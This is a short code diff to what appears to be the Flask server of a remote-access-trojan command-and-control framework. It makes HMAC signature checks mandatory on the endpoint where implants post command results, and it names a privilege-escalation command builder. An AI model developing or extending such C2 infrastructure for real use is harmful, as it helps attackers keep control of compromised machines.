@@ -3125,12 +3125,22 @@ def _build_privesc_command(platform: str) -> str | None:
 @app.route('/command/<client_id>', methods=['POST'])
 @app.route(f'{route_malleable}<client_id>', methods=['POST'])
 def receive_result(client_id):
-    # HMAC validation (optional — validates if X-Signature header is present)
+    # HMAC validation — mandatory when c2_require_beacon_hmac is enabled
+    import hashlib as _hashlib_mod
+    import hmac as _hmac_mod
+
+    _rat_key = getattr(config, 'rat_key', '') or ''
+    _require_hmac = bool(getattr(config, 'c2_require_beacon_hmac', False))
     _sig_header = request.headers.get('X-Signature', '')
+    if _require_hmac:
+        if not _rat_key:
+            return jsonify({
+                "status": "error",
+                "message": "Beacon HMAC enforcement is enabled but rat_key is not configured",
+            }), 500
+        if not _sig_header:
+            return jsonify({"status": "error", "message": "Missing signature"}), 401
     if _sig_header:
-        import hashlib as _hashlib_mod
-        import hmac as _hmac_mod
-        _rat_key = getattr(config, 'rat_key', '') or ''
         if _rat_key:
             _body = request.get_data()
             _expected = _hmac_mod.new(_rat_key.encode(), _body, _hashlib_mod.sha256).hexdigest()
